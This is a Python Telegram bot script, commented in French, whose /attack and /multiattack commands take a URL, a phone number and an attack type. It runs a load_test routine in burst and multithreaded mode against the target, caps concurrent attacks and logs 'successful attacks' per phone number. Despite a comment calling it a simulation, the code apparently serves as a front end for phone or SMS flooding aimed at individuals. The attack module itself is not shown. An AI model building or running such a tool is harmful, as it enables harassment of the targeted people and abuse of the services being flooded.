import threading
import logging
from telebot import TeleBot
from globals import BOT_TOKEN, MAX_ACTIVE_ATTACKS
from modules.load_tester import load_test
from subprocess import run

bot = TeleBot(BOT_TOKEN)

# Variables globales
active_attacks = 0
lock = threading.Lock()

# Configuration des logs
logging.basicConfig(
    filename="attack_logs.txt",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

# Gestion des attaques actives
def manage_attack_sessions(increment=True):
    global active_attacks
    with lock:
        if increment:
            if active_attacks >= MAX_ACTIVE_ATTACKS:
                return False
            active_attacks += 1
        else:
            active_attacks -= 1
        return True

# Commande : Lancer une attaque basique
@bot.message_handler(commands=['attack'])
def attack_command(message):
    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message, "Usage : /attack <url> <numéro> <type>")
        return

    url = args[1]
    phone_number = args[2]
    attack_type = args[3]

    if not manage_attack_sessions(True):
        bot.reply_to(message, "⚠️ Trop d'attaques actives en ce moment. Réessayez plus tard.")
        return

    def attack_wrapper():
        try:
            # Simulation d'attaque
            load_test(url, phone_number, attack_type, 10, burst=True)
            bot.reply_to(message, f"Attaque terminée pour {phone_number}.")
            logging.info(f"Attaque réussie sur {phone_number} ({attack_type}).")
        finally:
            manage_attack_sessions(False)

    threading.Thread(target=attack_wrapper).start()
    bot.reply_to(message, f"Lancement de l'attaque sur {phone_number} ({attack_type})...")

# Commande : Multithreading
@bot.message_handler(commands=['multiattack'])
def multi_attack_command(message):
    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message, "Usage : /multiattack <url> <numéro> <type>")
        return

    url = args[1]
    phone_number = args[2]
    attack_type = args[3]

    thread = threading.Thread(target=load_test, args=(url, phone_number, attack_type, 20, True))
    thread.start()
    bot.reply_to(message, f"Multithreading activé pour {phone_number} ({attack_type}).")

# Commande : Rapports Automatiques
@bot.message_handler(commands=['logs'])
def show_logs(message):
    try:
        with open("attack_logs.txt", "r") as log_file:
            logs = log_file.read()
            bot.reply_to(message, f"📄 Logs des attaques :\n\n{logs[-4000:]}")  # Affiche les derniers logs
    except FileNotFoundError:
        bot.reply_to(message, "Aucun log trouvé.")

# Commande par défaut pour les messages inconnus
@bot.message_handler(func=lambda _: True)
def default_message(message):
    bot.reply_to(message, "Commande inconnue. Essayez /attack ou /multiattack.")

# Lancer le bot
if __name__ == "__main__":
    bot.polling()
